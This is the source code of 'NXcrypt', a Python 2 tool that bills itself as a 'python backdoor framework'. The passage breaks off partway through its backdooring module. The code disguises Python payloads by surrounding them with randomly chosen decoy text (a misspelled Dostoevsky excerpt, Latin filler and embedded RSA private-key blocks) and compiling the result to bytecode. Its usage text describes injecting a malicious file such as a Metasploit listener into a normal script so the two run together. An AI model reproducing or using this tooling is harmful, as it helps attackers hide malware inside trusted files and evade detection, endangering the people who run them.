#!/usr/bin/python2
#! coding : utf-8

"""

Usage :

# encrypt a python file

sudo ./nxcrypt.py --file=file_to_encrypt.py
sudo ./nxcrypt.py --file=file_to_encrypt.py --output=output_file.py

# inject a malicious python file into a normal python file

sudo ./nxcrypt --file=normal_file.py --backdoor-file=msf_listener.py --output=test.py


/* when you will execute the file 'test.py' the file 'normal_file.py' will be executed in the same time with
 the file 'msf_listener.py' with multi-threading system */

"""

# modules

import sys
import py_compile
import optparse
import os
import commands
import time
import random

error = '\033[37;41m'
error1 = '\033[1;m'

sucess = '\033[32m'
sucess1 = '\033[37m'


text = """

'''

Miusov, as a man man of breeding and deilcacy, could not but feel some inwrd qualms, when he reached the Father Superior's with Ivan: he felt ashamed of havin lost his temper. He felt that he ought to have disdaimed that despicable wretch, Fyodor Pavlovitch, too much to have been upset by him in Father Zossima's cell, and so to have forgotten himself. "Teh monks were not to blame, in any case," he reflceted, on the steps. "And if they're decent people here (and the Father Superior, I understand, is a nobleman) why not be friendly and courteous withthem? I won't argue, I'll fall in with everything, I'll win them by politness, and show them that I've nothing to do with that Aesop, thta buffoon, that Pierrot, and have merely been takken in over this affair, just as they have."

He determined to drop his litigation with the monastry, and relinguish his claims to the wood-cuting and fishery rihgts at once. He was the more ready to do this becuase the rights had becom much less valuable, and he had indeed the vaguest idea where the wood and river in quedtion were.

These excellant intentions were strengthed when he enterd the Father Superior's diniing-room, though, stricttly speakin, it was not a dining-room, for the Father Superior had only two rooms alltogether; they were, however, much larger and more comfortable than Father Zossima's. But tehre was was no great luxury about the furnishng of these rooms eithar. The furniture was of mohogany, covered with leather, in the old-fashionned style of 1820 the floor was not even stained, but evreything was shining with cleanlyness, and there were many chioce flowers in the windows; the most sumptuous thing in the room at the moment was, of course, the beatifuly decorated table. The cloth was clean, the service shone; there were three kinds of well-baked bread, two bottles of wine, two of excellent mead, and a large glass jug of kvas -- both the latter made in the monastery, and famous in the neigborhood. There was no vodka. Rakitin related afterwards that there were five dishes: fish-suop made of sterlets, served with little fish paties; then boiled fish served in a spesial way; then salmon cutlets, ice pudding and compote, and finally, blanc-mange. Rakitin found out about all these good things, for he could not resist peeping into the kitchen, where he already had a footing. He had a footting everywhere, and got informaiton about everything. He was of an uneasy and envious temper. He was well aware of his own considerable abilities, and nervously exaggerated them in his self-conceit. He knew he would play a prominant part of some sort, but Alyosha, who was attached to him, was distressed to see that his friend Rakitin was dishonorble, and quite unconscios of being so himself, considering, on the contrary, that because he would not steal moneey left on the table he was a man of the highest integrity. Neither Alyosha nor anyone else could have infleunced him in that.

Rakitin, of course, was a person of tooo little consecuense to be invited to the dinner, to which Father Iosif, Father Paissy, and one othr monk were the only inmates of the monastery invited. They were alraedy waiting when Miusov, Kalganov, and Ivan arrived. The other guest, Maximov, stood a little aside, waiting also. The Father Superior stepped into the middle of the room to receive his guests. He was a tall, thin, but still vigorous old man, with black hair streakd with grey, and a long, grave, ascetic face. He bowed to his guests in silence. But this time they approaced to receive his blessing. Miusov even tried to kiss his hand, but the Father Superior drew it back in time to aboid the salute. But Ivan and Kalganov went through the ceremony in the most simple-hearted and complete manner, kissing his hand as peesants do.

"We must apologize most humbly, your reverance," began Miusov, simpering affably, and speakin in a dignified and respecful tone. "Pardonus for having come alone without the genttleman you invited, Fyodor Pavlovitch. He felt obliged to decline the honor of your hospitalty, and not wihtout reason. In the reverand Father Zossima's cell he was carried away by the unhappy dissention with his son, and let fall words which were quite out of keeping... in fact, quite unseamly... as" -- he glanced at the monks -- "your reverance is, no doubt, already aware. And therefore, recognising that he had been to blame, he felt sincere regret and shame, and begged me, and his son Ivan Fyodorovitch, to convey to you his apologees and regrets. In brief, he hopes and desires to make amends later. He asks your blessinq, and begs you to forget what has takn place."

As he utterred the last word of his terade, Miusov completely recovered his self-complecency, and all traces of his former iritation disappaered. He fuly and sincerelly loved humanity again.

The Father Superior listened to him with diginity, and, with a slight bend of the head, replied:

"I sincerly deplore his absence. Perhaps at our table he might have learnt to like us, and we him. Pray be seated, gentlemen."

He stood before the holly image, and began to say grace, aloud. All bent their heads reverently, and Maximov clasped his hands before him, with peculier fervor.

It was at this moment that Fyodor Pavlovitch played his last prank. It must be noted that he realy had meant to go home, and really had felt the imposibility of going to dine with the Father Superior as though nothing had happenned, after his disgraceful behavoir in the elder's cell. Not that he was so very much ashamed of himself -- quite the contrary perhaps. But still he felt it would be unseemly to go to dinner. Yet hiscreaking carriage had hardly been brought to the steps of the hotel, and he had hardly got into it, when he sudddenly stoped short. He remembered his own words at the elder's: "I always feel when I meet people that I am lower than all, and that they all take me for a buffon; so I say let me play the buffoon, for you are, every one of you, stupider and lower than I." He longed to revenge himself on everone for his own unseemliness. He suddenly recalled how he had once in the past been asked, "Why do you hate so and so, so much?" And he had answered them, with his shaemless impudence, "I'll tell you. He has done me no harm. But I played him a dirty trick, and ever since I have hated him."

Rememebering that now, he smiled quietly and malignently, hesitating for a moment. His eyes gleamed, and his lips positively quivered.

"Well, since I have begun, I may as well go on," he decided. His predominant sensation at that moment might be expresed in the folowing words, "Well, there is no rehabilitating myself now. So let me shame them for all I am worht. I will show them I don't care what they think -- that's all!"

He told the caochman to wait, while with rapid steps he returnd to the monastery and staight to the Father Superior's. He had no clear idea what he would do, but he knew that he could not control himself, and that a touch might drive him to the utmost limits of obsenity, but only to obsenity, to nothing criminal, nothing for which he couldbe legally punished. In the last resort, he could always restrain himself, and had marvelled indeed at himself, on that score, sometimes. He appeered in the Father Superior's dining-room, at the moment when the prayer was over, and all were moving to the table. Standing in the doorway, he scanned the company, and laughing his prolonged, impudent, malicius chuckle, looked them all boldly in the face. "They thought I had gone, and here I am again," he cried to the wholle room.

For one moment everyone stared at him withot a word; and at once everyone felt that someting revolting, grotescue, positively scandalous, was about to happen. Miusov passed immeditaely from the most benevolen frame of mind to the most savage. All the feelings that had subsided and died down in his heart revived instantly.

"No! this I cannot endure!" he cried. "I absolutly cannot! and... I certainly cannot!"

The blood rushed to his head. He positively stammered; but he was beyyond thinking of style, and he seized his hat.

"What is it he cannot?" cried Fyodor Pavlovitch, "that he absolutely cannot and certanly cannot? Your reverence, am I to come in or not? Will you recieve me as your guest?"

"You are welcome with all my heart," answerred the Superior. "Gentlemen!" he added, "I venture to beg you most earnesly to lay aside your dissentions, and to be united in love and family harmoni- with prayer to the Lord at our humble table."

"No, no, it is impossible!" cryed Miusov, beside himself.

"Well, if it is impossible for Pyotr Alexandrovitch, it is impossible for me, and I won't stop. That is why I came. I will keep with Pyotr Alexandrovitch everywere now. If you will go away, Pyotr Alexandrovitch, I will go away too, if you remain, I will remain. You stung him by what you said about family harmony, Father Superior, he does not admit he is my realtion. That's right, isn't it, von Sohn? Here's von Sohn. How are you, von Sohn?"

"Do you mean me?" mutered Maximov, puzzled.

"Of course I mean you," cried Fyodor Pavlovitch. "Who else? The Father Superior cuold not be von Sohn."

"But I am not von Sohn either. I am Maximov."

"No, you are von Sohn. Your reverence, do you know who von Sohn was? It was a famos murder case. He was killed in a house of harlotry -- I believe that is what such places are called among you- he was killed and robed, and in spite of his venarable age, he was nailed up in a box and sent from Petersburg to Moscow in the lugage van, and while they were nailling him up, the harlots sang songs and played the harp, that is to say, the piano. So this is that very von Solin. He has risen from the dead, hasn't he, von Sohn?"

"What is happening? What's this?" voices were heard in the groop of monks.

"Let us go," cried Miusov, addresing Kalganov.

"No, excuse me," Fyodor Pavlovitch broke in shrilly, taking another stepinto the room. "Allow me to finis. There in the cell you blamed me for behaving disrespectfuly just because I spoke of eating gudgeon, Pyotr Alexandrovitch. Miusov, my relation, prefers to have plus de noblesse que de sincerite in his words, but I prefer in mine plus de sincerite que de noblesse, and -- damn the noblesse! That's right, isn't it, von Sohn? Allow me, Father Superior, though I am a buffoon and play the buffoon, yet I am the soul of honor, and I want to speak my mind. Yes, I am teh soul of honour, while in Pyotr Alexandrovitch there is wounded vanity and nothing else. I came here perhaps to have a look and speak my mind. My son, Alexey, is here, being saved. I am his father; I care for his welfare, and it is my duty to care. While I've been playing the fool, I have been listening and havig a look on the sly; and now I want to give you the last act of the performence. You know how things are with us? As a thing falls, so it lies. As a thing once has falen, so it must lie for ever. Not a bit of it! I want to get up again. Holy Father, I am indignent with you. Confession is a great sacrament, before which I am ready to bow down reverently; but there in the cell, they all kneal down and confess aloud. Can it be right to confess aloud? It was ordained by the holy Fathers to confess in sercet: then only your confession will be a mystery, and so it was of old. But how can I explain to him before everyone that I did this and that... well, you understand what -- sometimes it would not be proper to talk about it -- so it is really a scandal! No, Fathers, one might be carried along with you to the Flagellants, I dare say.... att the first opportunity I shall write to the Synod, and I shall take my son, Alexey, home."

We must note here that Fyodor Pavlovitch knew whree to look for the weak spot. There had been at one time malicius rumors which had even reached the Archbishop (not only regarding our monastery, but in others where the instutition of elders existed) that too much respect was paid to the elders, even to the detrement of the auhtority of the Superior, that the elders abused the sacrament of confession and so on and so on -- absurd charges which had died away of themselves everywhere. But the spirit of folly, which had caught up Fyodor Pavlovitch and was bearring him on the curent of his own nerves into lower and lower depths of ignominy, prompted him with this old slander. Fyodor Pavlovitch did not understand a word of it, and he could not even put it sensibly, for on this occasion no one had been kneelling and confesing aloud in the elder's cell, so that he could not have seen anything of the kind. He was only speaking from confused memory of old slanders. But as soon as he had uttered his foolish tirade, he felt he had been talking absurd nonsense, and at once longed to prove to his audiance, and above all to himself, that he had not been talking nonsense. And, though he knew perfectily well that with each word he would be adding morre and more absurdity, he could not restrian himself, and plunged forward blindly.

"How disgraveful!" cried Pyotr Alexandrovitch.

"Pardon me!" said the Father Superior. "It was said of old, 'Many have begun to speak agains me and have uttered evil sayings about me. And hearing it I have said to myself: it is the correcsion of the Lord and He has sent it to heal my vain soul.' And so we humbely thank you, honored geust!" and he made Fyodor Pavlovitch a low bow.

"Tut -- tut -- tut -- sanctimoniuosness and stock phrases! Old phrasses and old gestures. The old lies and formal prostratoins. We know all about them. A kisss on the lips and a dagger in the heart, as in Schiller's Robbers. I don't like falsehood, Fathers, I want the truth. But the trut is not to be found in eating gudgeon and that I proclam aloud! Father monks, why do you fast? Why do you expect reward in heaven for that? Why, for reward like that I will come and fast too! No, saintly monk, you try being vittuous in the world, do good to society, without shuting yourself up in a monastery at other people's expense, and without expecting a reward up aloft for it -- you'll find taht a bit harder. I can talk sense, too, Father Superior. What have they got here?" He went up to the table. "Old port wine, mead brewed by the Eliseyev Brothers. Fie, fie, fathers! That is something beyond gudgeon. Look at the bottles the fathers have brought out, he he he! And who has provided it all? The Russian peasant, the laborer, brings here the farthing earned by his horny hand, wringing it from his family and the tax-gaterer! You bleed the people, you know, holy Fathers."

"This is too disgraceful!" said Father Iosif.

Father Paissy kept obsinately silent. Miusov rushed from the room, and Kalgonov afetr him.

"Well, Father, I will follow Pyotr Alexandrovitch! I am not coming to see you again. You may beg me on your knees, I shan't come. I sent you a thousand roubles, so you have begun to keep your eye on me. He he he! No, I'll say no more. I am taking my revenge for my youth, for all the humillition I endured." He thumped the table with his fist in a paroxysm of simulated feelling. "This monastery has played a great part in my life! It has cost me many bitter tears. You used to set my wife, the crazy one, against me. You cursed me with bell and book, you spread stories about me all over the place. Enough, fathers! This is the age of Liberalizm, the age of steamers and reilways. Neither a thousand, nor a hundred ruobles, no, nor a hundred farthings will you get out of me!"

It must be noted again that our monastery never had played any great part in his liffe, and he never had shed a bitter tear owing to it. But he was so carried away by his simulated emotion, that he was for one momant allmost beliefing it himself. He was so touched he was almost weeping. But at that very instant, he felt that it was time to draw back.

The Father Superior bowed his head at his malicious lie, and again spoke impressively:

"It is writen again, 'Bear circumspecly and gladly dishonor that cometh upon thee by no act of thine own, be not confounded and hate not him who hath dishonored thee.' And so will we."

"Tut, tut, tut! Bethinking thyself and the rest of the rigmarole. Bethink yourselfs Fathers, I will go. But I will take my son, Alexey, away from here for ever, on my parental authority. Ivan Fyodorovitch, my most dutiful son, permit me to order you to follow me. Von Sohn, what have you to stay for? Come and see me now in the town. It is fun there. It is only one short verst; instead of lenten oil, I will give you sucking-pig and kasha. We will have dinner with some brendy and liqueur to it.... I've cloudberry wyne. Hey, von Sohn, don't lose your chance." He went out, shuoting and gesticulating.

It was at that moment Rakitin saw him and pointed him out to Alyosha.

"Alexey!" his father shouted, from far off, cacthing sight of him. "You come home to me to-day, for good, and bring your pilow and matress, and leeve no trace behind."

Alyosha stood rooted to the spot, wacthing the scene in silense. Meanwhile, Fyodor Pavlovitch had got into the carriege, and Ivan was about to follow him in grim silance without even turnin to say good-bye to Alyosha. But at this point another allmost incrediple scene of grotesque buffoonery gave the finishng touch to the episode. Maximov suddenly appeered by the side of the carriage. He ran up, panting, afraid of being too late. Rakitin and Alyosha saw him runing. He was in such a hurry that in his impatiense he put his foot on the step on which Ivan's left foot was still resting, and clucthing the carriage he kept tryng to jump in. "I am going with you! " he kept shouting, laughing a thin mirthfull laugh with a look of reckless glee in his face. "Take me, too."

"There!" cried Fyodor Pavlovitch, delihted. "Did I not say he waz von Sohn. It iz von Sohn himself, risen from the dead. Why, how did you tear yourself away? What did you von Sohn there? And how could you get away from the dinner? You must be a brazen-faced fellow! I am that myself, but I am surprized at you, brother! Jump in, jump in! Let him pass, Ivan. It will be fun. He can lie somwhere at our feet. Will you lie at our feet, von Sohn? Or perch on the box with the coachman. Skipp on to the box, von Sohn!"

But Ivan, who had by now taken his seat, without a word gave Maximov a voilent punch in the breast and sent him flying. It was quite by chanse he did not fall.

"Drive on!" Ivan shouted angryly to the coachman.

"Why, what are you doing, what are you abuot? Why did you do that?" Fyodor Pavlovitch protested.

But the cariage had already driven away. Ivan made no reply.

"Well, you are a fellow," Fyodor Pavlovitch siad again.

After a pouse of two minutes, looking askance at his son, "Why, it was you got up all this monastery busines. You urged it, you approvved of it. Why are you angry now?"

"You've talked rot enough. You might rest a bit now," Ivan snaped sullenly.

Fyodor Pavlovitch was silent again for two minutes.

"A drop of brandy would be nice now," he observd sententiosly, but Ivan made no repsonse.

"You shall have some, too, when we get home."

Ivan was still silent.

Fyodor Pavlovitch waited anohter two minites.

"But I shall take Alyosha away from the monastery, though you will dislike it so much, most honored Karl von Moor."

Ivan shruged his shuolders contemptuosly, and turning away stared at the road. And they did not speek again all the way home.

'''

"""

lorem = """

'''


Itaque verae amicitiae difficillime reperiuntur in iis qui in honoribus reque publica versantur; ubi enim istum invenias qui honorem amici anteponat suo? Quid? Haec ut omittam, quam graves, quam difficiles plerisque videntur calamitatum societates! Ad quas non est facile inventu qui descendant. Quamquam Ennius recte.

Et interdum acciderat, ut siquid in penetrali secreto nullo citerioris vitae ministro praesente paterfamilias uxori susurrasset in aurem, velut Amphiarao referente aut Marcio, quondam vatibus inclitis, postridie disceret imperator. ideoque etiam parietes arcanorum soli conscii timebantur.

Iamque lituis cladium concrepantibus internarum non celate ut antea turbidum saeviebat ingenium a veri consideratione detortum et nullo inpositorum vel conpositorum fidem sollemniter inquirente nec discernente a societate noxiorum insontes velut exturbatum e iudiciis fas omne discessit, et causarum legitima silente defensione carnifex rapinarum sequester et obductio capitum et bonorum ubique multatio versabatur per orientales provincias, quas recensere puto nunc oportunum absque Mesopotamia digesta, cum bella Parthica dicerentur, et Aegypto, quam necessario aliud reieci ad tempus.

Eodem tempore Serenianus ex duce, cuius ignavia populatam in Phoenice Celsen ante rettulimus, pulsatae maiestatis imperii reus iure postulatus ac lege, incertum qua potuit suffragatione absolvi, aperte convictus familiarem suum cum pileo, quo caput operiebat, incantato vetitis artibus ad templum misisse fatidicum, quaeritatum expresse an ei firmum portenderetur imperium, ut cupiebat, et cunctum.

Utque aegrum corpus quassari etiam levibus solet offensis, ita animus eius angustus et tener, quicquid increpuisset, ad salutis suae dispendium existimans factum aut cogitatum, insontium caedibus fecit victoriam luctuosam.

Nec sane haec sola pernicies orientem diversis cladibus adfligebat. Namque et Isauri, quibus est usitatum saepe pacari saepeque inopinis excursibus cuncta miscere, ex latrociniis occultis et raris, alente inpunitate adulescentem in peius audaciam ad bella gravia proruperunt, diu quidem perduelles spiritus inrequietis motibus erigentes, hac tamen indignitate perciti vehementer, ut iactitabant, quod eorum capiti quidam consortes apud Iconium Pisidiae oppidum in amphitheatrali spectaculo feris praedatricibus obiecti sunt praeter morem.

Unde Rufinus ea tempestate praefectus praetorio ad discrimen trusus est ultimum. ire enim ipse compellebatur ad militem, quem exagitabat inopia simul et feritas, et alioqui coalito more in ordinarias dignitates asperum semper et saevum, ut satisfaceret atque monstraret, quam ob causam annonae convectio sit impedita.

Hac ita persuasione reducti intra moenia bellatores obseratis undique portarum aditibus, propugnaculis insistebant et pinnis, congesta undique saxa telaque habentes in promptu, ut si quis se proripuisset interius, multitudine missilium sterneretur et lapidum.

Nihil est enim virtute amabilius, nihil quod magis adliciat ad diligendum, quippe cum propter virtutem et probitatem etiam eos, quos numquam vidimus, quodam modo diligamus. Quis est qui C. Fabrici, M'. Curi non cum caritate aliqua benevola memoriam usurpet, quos numquam viderit? quis autem est, qui Tarquinium Superbum, qui Sp. Cassium, Sp. Maelium non oderit? Cum duobus ducibus de imperio in Italia est decertatum, Pyrrho et Hannibale; ab altero propter probitatem eius non nimis alienos animos habemus, alterum propter crudelitatem semper haec civitas oderit.

Sed cautela nimia in peiores haeserat plagas, ut narrabimus postea, aemulis consarcinantibus insidias graves apud Constantium, cetera medium principem sed siquid auribus eius huius modi quivis infudisset ignotus, acerbum et inplacabilem et in hoc causarum titulo dissimilem sui.

Isdem diebus Apollinaris Domitiani gener, paulo ante agens palatii Caesaris curam, ad Mesopotamiam missus a socero per militares numeros immodice scrutabatur, an quaedam altiora meditantis iam Galli secreta susceperint scripta, qui conpertis Antiochiae gestis per minorem Armeniam lapsus Constantinopolim petit exindeque per protectores retractus artissime tenebatur.

Vide, quantum, inquam, fallare, Torquate. oratio me istius philosophi non offendit; nam et complectitur verbis, quod vult, et dicit plane, quod intellegam; et tamen ego a philosopho, si afferat eloquentiam, non asperner, si non habeat, non admodum flagitem. re mihi non aeque satisfacit, et quidem locis pluribus. sed quot homines, tot sententiae; falli igitur possumus.

Ibi victu recreati et quiete, postquam abierat timor, vicos opulentos adorti equestrium adventu cohortium, quae casu propinquabant, nec resistere planitie porrecta conati digressi sunt retroque concedentes omne iuventutis robur relictum in sedibus acciverunt.

Ego vero sic intellego, Patres conscripti, nos hoc tempore in provinciis decernendis perpetuae pacis habere oportere rationem. Nam quis hoc non sentit omnia alia esse nobis vacua ab omni periculo atque etiam suspicione belli?

Ac ne quis a nobis hoc ita dici forte miretur, quod alia quaedam in hoc facultas sit ingeni, neque haec dicendi ratio aut disciplina, ne nos quidem huic uni studio penitus umquam dediti fuimus. Etenim omnes artes, quae ad humanitatem pertinent, habent quoddam commune vinculum, et quasi cognatione quadam inter se continentur.

Iis igitur est difficilius satis facere, qui se Latina scripta dicunt contemnere. in quibus hoc primum est in quo admirer, cur in gravissimis rebus non delectet eos sermo patrius, cum idem fabellas Latinas ad verbum e Graecis expressas non inviti legant. quis enim tam inimicus paene nomini Romano est, qui Ennii Medeam aut Antiopam Pacuvii spernat aut reiciat, quod se isdem Euripidis fabulis delectari dicat, Latinas litteras oderit?

Post quorum necem nihilo lenius ferociens Gallus ut leo cadaveribus pastus multa huius modi scrutabatur. quae singula narrare non refert, me professione modum, quod evitandum est, excedamus.

Ipsam vero urbem Byzantiorum fuisse refertissimam atque ornatissimam signis quis ignorat? Quae illi, exhausti sumptibus bellisque maximis, cum omnis Mithridaticos impetus totumque Pontum armatum affervescentem in Asiam atque erumpentem, ore repulsum et cervicibus interclusum suis sustinerent, tum, inquam, Byzantii et postea signa illa et reliqua urbis ornanemta sanctissime custodita tenuerunt.

Nisi mihi Phaedrum, inquam, tu mentitum aut Zenonem putas, quorum utrumque audivi, cum mihi nihil sane praeter sedulitatem probarent, omnes mihi Epicuri sententiae satis notae sunt. atque eos, quos nominavi, cum Attico nostro frequenter audivi, cum miraretur ille quidem utrumque, Phaedrum autem etiam amaret, cotidieque inter nos ea, quae audiebamus, conferebamus, neque erat umquam controversia, quid ego intellegerem, sed quid probarem.

Paphius quin etiam et Cornelius senatores, ambo venenorum artibus pravis se polluisse confessi, eodem pronuntiante Maximino sunt interfecti. pari sorte etiam procurator monetae extinctus est. Sericum enim et Asbolium supra dictos, quoniam cum hortaretur passim nominare, quos vellent, adiecta religione firmarat, nullum igni vel ferro se puniri iussurum, plumbi validis ictibus interemit. et post hoe flammis Campensem aruspicem dedit, in negotio eius nullo sacramento constrictus.
'''

"""

rsa = """

'''

MIICWgIBAAKBgHbARCDwIVdzyxi3I36sz1hFP3Rkz+Ac0AaP1kINmCcGuKsFd0K3
UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDRNGr0KoQTpRcEYBjOf32tovof
OSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O0w1ZSxz9KlSVzr0HAgMBAAEC
gYAs0iTkyb3L5Eij63vaNB+OkZSBugs766QY1fFovPjQwhixdD6vT8JkrOc/G97N
FSB/uBVbFehpopfbcjeguTMPPr7LwJbzwn4xD9u0AotzcO6JnB0k/D1Ixn3IYOY0
o0wmKCq/4Gq6pzsjpJFTG6c5kCszMyQDbMmBWQmeM6ESAQJBALDWs4C07Rw/riCc
KmlG1jtp9x1Uc8zfAlE9FXcdnfidYy/LUhpLtdZNZrHBZ+/P/LbX3kHQijXD7avd
E3MP5NkCQQCr6NuKbRD0NnkTBuWrVPnAxBzO1E8VZF1rFKDXB7UHwtejwcUs3iUt
CTGfr1l+3kj+0aNXCTvDBYxaIUxsmwTfAkAsxpA43JbU+kLKuv/6HBeOf6w0Xvfb
PfRGQaM3v+YJ10AQD/k/8z+dfYetJn18uTsRyOLb40O7jVqWk6mjDrkxAkA5eNHc
x3XBj2yO1eF2lCQjM+1FoGkIB9PLdswG14bIH3WkQ6W9yE65bbdvYVoUNhBFUKTA
9k9KddJkV3mLXZAVAkACHbnraUo727FUodBf48TZkyz6DDOUh4BoJdGq2EDKYWr5
ULGFBeItYZsaSlIc3VtfZdaXcRXRNIjbEOHPLGbb
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHbARCDwIVdzyxi3I36sz1hFP3Rk
z+Ac0AaP1kINmCcGuKsFd0K3UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDR
NGr0KoQTpRcEYBjOf32tovofOSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O
0w1ZSxz9KlSVzr0HAgMBAAE=

'''

"""


rsa1 = """

'''

MIIEpQIBAAKCAQEAmDmgQAXKaHyTUVf3h/skxS3zVrsdT/8vK9hIl+swQ66sUAqw
ZJDhSX7HposlKgdz6TtVzWLZr/s1m1lJCzCGFbxTHA+w7dsG0qkuhAdZzx1mTHXk
Uhs0sNMq/PsWTGzBJAJvKtqY+/c1IOKKadt5EBxm9RPnK6BAktD+vr9XnNODGjr1
8yqEOmFELHrwpNNKa8NLqxYiCiQV58DE/5NO0V/OqNLlkwR8KNM9BooeTYRG+A3J
2ZfKIrvhFLVXiVRRn/p2ZwB23hFJMT91UOVbvJa5Gpm2RrIe9rUxuF6srD8fnkOU
CJh4FbPJleHZyC7KYOOhAcjPNCu5NI4a5H2oCQIDAQABAoIBAC9FHcUjxzHhFWIa
HeylCUsNtNXG7xhLVtuXoxtB1k/+KtYEK7he4QaQjvDhnp3JiK3xVficbJrgOEpQ
VIVcARc4ztoU6U1DSYAbNy2alsHhEEZICamRdzA9ssiyM79xuhwzgU/eZ8k+f8oB
bxfmJlbhavtJvexnLAYrTh/vjQZOkXomAYSQJya72CfpDxWkiPEOJjBSSib2j9yY
0x5F/M8eVhB48LNvoPvbkW/FsnlJAerKIOYQZQA8NgZkBpCbanVnJ0XT10M68+lT
Wa+8+fZcsSnby6Arkr0MkJdeSJdeAYrWpLoqJyEozhUJvxgtjdIJM81bf2Sl+zJr
WcMIjPECgYEAxh81bnaQ+19V1S0gWaHxQzbnqtwNZ47YrZnB9bkkvrBtYvRR1ev9
170Dt7c0AomyY50mP4efp3ZgJJ2OYWSg0exB6kgblIj89rFQWGJwMQrWoSSqK1Fk
WswFKzfI7qrdnB8Xzvly3lI+alJd2HYSO9xvo8A05ly8/lxVEE/aO20CgYEAxLH3
yMp7X4jGykNN31IJR9TGznPt5BcuFmL+eT6X/EIquRuHLCb6TzDR1OT6LSMWxPqS
dVKx97hH4gT7gDSAPNVGS1NFx+PQMPwzdLIYG/9eW+GyPPRu7SEmEs489V75uTmB
PRFGNwM5M94Khpx8AgmkSHKiDT523t3Thk4dgY0CgYEAvkJKNYJ3SG8NJmLnpiv2
XO3lHBemZ8SuIEiAE1FxEA6tfVHTJPQ0GXHSmCK/N5C0VyUbDfdYQqFTQtZrXOwd
5HpV8n68va+v/dfZqIcf5njaFHX5VRAcp3U1oYM42roLh1n0qzayMP4aIlBm/vCk
IghWzZJPOsnkVQCmT7vffyECgYEAhu9L+9wkPMqZDSKU5nHh2fw3EmRnO0VHoaXx
yv1MyIofwvMGjRyENRVZrYITuilLMoBvPrsnSbiK35vpaO8bViA9Y+lRgqpfJWuu
ZQzUC0jp04CGhNhuzJAkDVycZvvrtsyjQ2B5Wb4FXPajI+twCvnQUL8LOqiyZXup
44XtKfUCgYEAs8DsRxHqL/nu9akH5MWKqxKsH1oeUeMTL0MLkBpJKkLnAu/pSQz9
y41V0jYgz7hO9Voiv1xaFRlXbhP75RzaEwDf5afDDJbsU1jsXMmcXvcAEGUG3s6p
NcPjjBvjld4EM+nuFCY6C62819jmD/jQ2FzA5hMiPne4tGb+JLO5cAg=

'''

"""
stringo = [rsa,rsa1,lorem,text]
_output_ = "backdoor.py" # edit this line is you want edit default output .
_byte_ = (_output_) + "c" # bytecode format

# if platform is linux and NXcrypt isn't launched  as root
if (sys.platform.startswith("linux")) :
	if (commands.getoutput("whoami")) != "root" :
		print ("run it as root")
		sys.exit() #exit
	else:
		pass
else:
    pass


d = 1
p = random.randint(9,20)


#menu
menu = """

d8b   db db    db  .o88b. d8888b. db    db d8888b. d888888b
888o  88 `8b  d8' d8P  Y8 88  `8D `8b  d8' 88  `8D `~~88~~'
88V8o 88  `8bd8'  8P      88oobY'  `8bd8'  88oodD'    88
88 V8o88  .dPYb.  8b      88`8b      88    88~~~      88
88  V888 .8P  Y8. Y8b  d8 88 `88.    88    88         88
VP   V8P YP    YP  `Y88P' 88   YD    YP    88         YP
                                        (python backdoor framework)

                                        Version 3.0
                                        Codename: 'WannaLaugh'

       """
menu_linux = "\033[32m" + (menu) + "\033[37m"

name = """
+----------------------------------------------+
|                                              |
| -NXcrypt functionalities:                    |
|      - python backdoor obfustation           |
|      - backdooring python file  with         |
|        a malicious python file               |
|                                              |
| -Author: Hadi Mene (H4d3s)                   |
| -Credits : Suspicious Shell Activity         |
+----------------------------------------------+
	   """

name_linux = "\033[32m" +  (name) + "\033[37m"


#options

parser = optparse.OptionParser()
parser.add_option("--file", "-f", help="python file  ", action="store", dest="file")
parser.add_option("--output", "-o", help="output of python file ", dest="out", action="store")
parser.add_option("--backdoor-file","-b",help="malicious python file to inject into normal file with multi-threading system",action="store",dest="backdoor")

option , arg = parser.parse_args()
if not option.file :

	parser.error("python file hasn't given type --help for help ")
	sys.exit()


# Encryption module

elif  option.file and not option.backdoor :

	print (menu_linux)
	print (name_linux)

	payload = (option.file)
	try:

		didi = open(payload,'r')
		hades = didi.read()
		didi.close()
	except:
		sys.exit(error+"[-] cannot read file '{}'".format(payload)+error1)


	hd = open(payload,'w')
	while (d) != (p) :
		hd.write(random.choice(stringo))
		d += 1
	hd.close()

	albania = open(payload,'a')
	albania.write(hades)
	albania.close()

	india = open(payload,'a')

	d = 1
	p = random.randint(9,20)


	while (d) != (p) :
		india.write(random.choice(stringo))
		d += 1
	india.close()


	if not option.out :
		try:
			py_compile.compile(payload, cfile=_byte_, dfile=None, doraise=False, ) #compilation
		except (py_compile.PyCompileError,IOError,TypeError) :
			sys.exit("encryption error :  file  {} don't exist or it's already crypted  or specify the full path (Ex:/root/backdoor/listener.py".format(option.file)) #error
		#print (sucess+"[*] file : {}".format(option.file)+sucess1)
		#print (sucess+"[*] default output : {}".format(_output_)+sucess1)
		if (sys.platform.startswith("linux"))  :
			os.system(" mv  {} {} ".format(_byte_,_output_))

		elif (sys.platform.startswith("windows")) :
			os.system(" rename {} {} ".format(_byte_,_output_))

		elif (sys.platform.startswith("darwin")):
			os.system(" mv {}  {} ".format(_byte_,_output_))

		#print (sucess+"[+] encryption finished"+sucess1)
		#print (sucess+"[+] file : {} ".format(_output_)+sucess1)
	elif option.out  :
		output = option.out
		bytecode = (option.out) + "c"
		#print (sucess+"[*] file : {}".format(option.file)+sucess1)
		#print (sucess+"[*] output : {}".format(output)+sucess1)
		try :
			py_compile.compile(payload, cfile=bytecode, dfile=None, doraise=False, ) #compilation
		except (py_compile.PyCompileError,IOError,TypeError) :
			sys.exit("encryption error : file don't exist or it's already crypted  or specify the full path (Ex:/root/backdoor/listener.py")
		if (sys.platform.startswith("linux")):
			os.system("mv {}  {} ".format(bytecode,output))
		elif (sys.platform.startswith("windows")):
			os.system("rename {}  {} ".format(bytecode,output))
		elif (sys.platform.startswith("darwin")):
			os.system("mv {}  {} ".format(bytecode,output))

		#print (sucess+"[+] encryption finished  "+sucess1)
		#print (sucess+"[*] file : {} ".format(output)+sucess1)
                time.sleep(5)
                sys.exit() #exit




# Backdooring module

elif (option.backdoor) :

	print (menu_linux)
	print (name_linux)


	if (option.out) :
		_output_ = (option.out)
		time.sleep(2)
		try:
			file_to_write = open(option.file,'r').read()
		except :
			sys.exit(error+"[-] cannot read file {}".format(option.file)+error1)
		try:
			backdoor_to_write = open(option.backdoor,'r').read()
		except :
